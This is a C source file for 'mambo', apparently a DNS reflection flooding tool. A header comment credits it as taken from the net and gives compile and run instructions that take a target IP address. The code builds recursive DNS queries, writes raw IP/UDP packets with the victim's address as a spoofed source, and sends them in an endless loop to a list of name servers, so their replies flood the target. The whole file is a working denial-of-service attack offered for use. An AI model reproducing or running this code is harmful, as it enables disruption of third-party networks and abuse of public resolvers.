//
//	STOLEN FROM THE NET P)
//
/*   to build and run me cut and paste the below 10 lines into your shell on a nice LINUX box
# compile  me 
#
  gcc   mambo.c -o mambo
#
# run me                                                                                                      
#         TARGET IP                    NICE BIG FQDNS TO RESOLVE   
./mambo   192.168.0.121                 www.loud-fat-bloke.co.uk
#
#
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>     
#include <string.h>         
#include <netdb.h>         
#include <sys/types.h>    
#include <sys/socket.h>  
#include <netinet/in.h>    
#include <netinet/ip.h>   
#include <netinet/udp.h> 
#include <arpa/inet.h>  
#include <net/if.h>    
#include <sys/socket.h>
#include <syslog.h>
#include <netinet/in.h>
#include <stdio.h>
int udpsockfd,n;

#define PROGRAM    "MAMBO"
#define DELAY      500 // millonth of a second
 
//List of DNS Servers registered on the system
char dns_servers[10][100];
int dns_server_count = 0;
//Types of DNS resource records :)
 
#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server
 
//Function Prototypes
void buildnsheader  ( int);

//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 
//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
{
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};
#pragma pack(pop)
 
//Pointers to resource record contents
struct RES_RECORD
{
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
};
 
//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;


unsigned char buf[4000];
int dnslength ;                                            


// Define some constants.
#define IP4_HDRLEN 20         // IPv4 header length
#define UDP_HDRLEN  8         // UDP header length, excludes data

int
spoofudp (char *saddr,int sport, char *daddr, int   dport, int datalen,  char *udppacket)
{
  int   sd ;
  const int on = 1;
  struct ip iphdr, *iphdr_ptr;
  struct udphdr udphdr, *udphdr_ptr;
  unsigned char *data, *packet;
  struct sockaddr_in  sin;
  unsigned  char  x[10000];     // the buffer
//                                                  Allocate memory for various headers and offsets.
  packet       = x     ;
  iphdr_ptr = x     ;
//  datalen = dnslength;        
//  UDP header  ptr .
  udphdr_ptr =       (packet + IP4_HDRLEN);
//  UDP data ptr .
  data =  (packet + IP4_HDRLEN + UDP_HDRLEN);
//                                                  UDP data -copy it at the end
  memcpy (data  , udppacket ,datalen   );
// IPv4 header
  iphdr_ptr->ip_hl =5;
  iphdr_ptr->ip_v = 4;
  iphdr_ptr->ip_tos = 0;
  iphdr_ptr->ip_len = htons (IP4_HDRLEN + UDP_HDRLEN + datalen);
  iphdr_ptr->ip_id = htons (0);
  iphdr_ptr->ip_off = htons (0);
  iphdr_ptr->ip_ttl = 255;
  iphdr_ptr->ip_p = IPPROTO_UDP;
  iphdr_ptr->ip_dst.s_addr = inet_addr (daddr );          
  iphdr_ptr->ip_src.s_addr = inet_addr (saddr );     /* SPOOOOPH di source IP */
  iphdr_ptr->ip_sum = 0;  //kernel do this please

//                                                   UDP header
  udphdr_ptr->source = htons (sport);
  udphdr_ptr->dest = htons (dport);
  udphdr_ptr->len = htons (UDP_HDRLEN + datalen);
  udphdr_ptr->check = 0;                              // hey misterkernal do your job for me
//                                                   zero ise sockeet  data.
  memset (&sin, 0, sizeof (struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = iphdr_ptr->ip_dst.s_addr;
//                                                   open a raw socket 
  if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror ("socket() failed ");
    exit (2);
  }
// unless the socket is set with IP_HDRINCL a random IP datagram will go
// out on the wire  nearly all Linux kernals allow many bsd sun aix and hp dont 
  if (setsockopt (sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0) {
    perror ("setsockopt() failed to set IP_HDRINCL ");
    exit (3);
  }
//                                                    Send packet.
  if (sendto (sd, packet, IP4_HDRLEN + UDP_HDRLEN + datalen, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) < 0)  {
    perror ("sendto() failed ");
    exit (EXIT_FAILURE);
  }
// Close socket descriptor.
  close (sd);
}


void usage ()
  {
  fprintf(stderr,"\n\nUsage: %s   TARGET_IP  FQDNS  NAME_SERVERS_LIST\n\n", PROGRAM);
  exit(1);
  }

unsigned char hostname[100];
unsigned char out[1000];
int len1 = 0, len2 = 0 ,len3 = 0   ;
int pants;
 
int
main( int argc , char *argv[])
  {
  char *out_temp;
  if ( argc != 4 )
     usage();
  strcpy(hostname, argv[2]);

//  set a pointer to the front of the matter
  out_temp=out;
  len1=  conv_fqdns2rr(hostname,out_temp);
//
//  conv-fqdns2rr was written to build multiple queries to bulk up the response if you get it working let me know
//  out_temp=&out[len1+2 ];
//  len2=  conv_fqdns2rr("www.loud-fat_bloke.uk",out_temp);
//
  dnslength = len1 + len2 + 12 +5  ;
  buildnsheader(T_A);

	char fragments[3000][20]; //can hold 2000 19-character strings
	FILE * fp;
	char * line = NULL;
	size_t len = 0;
	ssize_t read;
	char dns_file[128];
	int position = 0, aza=0, zaz=0;
  	strcpy(dns_file, "./");
	strcat(dns_file,argv[3]);

	fp = fopen(dns_file, "r");
	if (fp == NULL)
		exit(EXIT_FAILURE);

	while ((read = getline(&line, &len, fp)) != -1) {
		strcpy(fragments[position], line);
		position++;
	}
	fclose(fp);


	while( 1 ) {
		aza++; 
		if ( aza % 1000 == 0 ) { printf("%d\n",aza); }
		zaz = aza % position;
		spoofudp (argv[1],4950, fragments[zaz] , 53 , dnslength, buf );
		usleep(DELAY);
	}

	return 0;
}
// build a DNS format FQDNS
//  i.e     3wwwwAloud-fat-bloke2co2uk00101   where the numbers are lens of thesubsequent string
//   terminated in query type 
int 
conv_fqdns2rr(  char *hosta, char *outa)
  {
  char m[1000];
  char c[1000],  *cp;
  struct QUESTION *qinfo = NULL;
  int i=0;
  memset (m   , 0, 1000) ;
  memset (c   , 0, 1000) ;
//            
  strcpy (c, hosta);                    // protect the origin storable from strings.h
  cp  =strtok(c,".");                    
  sprintf(m+1,"%s" , cp);              // first string
  m[0] = (int) strlen(cp);             //  now put the length in the first byte
  strcat(outa, m   ) ;  
//                                        
  while (  (cp=strtok(NULL    ,".")) != NULL )
    {
    memset (m   , 0, 1000) ;
//                                       ditto but in a loop
    sprintf(m+1,"%s" , cp       );
    m[0] = (int) strlen(cp     );
    strcat(outa, m   ) ;  
    } 
  i    = (int) strlen(outa   );
// Append the question structure to the end to show its IPV4 and ADDRESS request
  qinfo =  (struct QUESTION * ) &outa[1 +   i]; //   Terminate the string  with "\0" then the questions
  qinfo->qtype = htons(1); //type of the query  A 
  qinfo->qclass = htons(1); //its internet (lol)
  i = 1 + i + sizeof(struct QUESTION  ) ;
  return(i);
  }
/*
 * build  a DNS query in global variable buf 
 * */
void buildnsheader  ( int query_type)
  {
  unsigned char *qname,*reader;
  int i , j , stop , s, pants;
  struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
  struct DNS_HEADER *dns = NULL;
 
  //Set the DNS structure to standard queries
  dns = (struct DNS_HEADER *)&buf;
 
  dns->id = (unsigned short) htons(getpid());
  dns->qr = 0; //This is a query
  dns->opcode = 0; //This is a standard query
  dns->aa = 0; //Not Authoritative
  dns->tc = 0; //This message is not truncated
//   This is key 
  dns->rd = 1; //Recursion Desired    1
  dns->ra = 0; //Recursion not available! stub resolver                          
  dns->z = 0;
  dns->ad = 0;
  dns->cd = 0;
  dns->rcode = 0;
  dns->q_count = htons(1); //we have only 1 question couldnt get multi query working
  dns->ans_count = 0;
  dns->auth_count = 0;
  dns->add_count = 0;
 // copy in the fqdns to the query p
  qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];
  pants= 0;
// copy the FQDSN at the end 
  memcpy(qname , out, len1 +len2+1 );  // allowed for two dns in the query but never got working
  return ;
  }
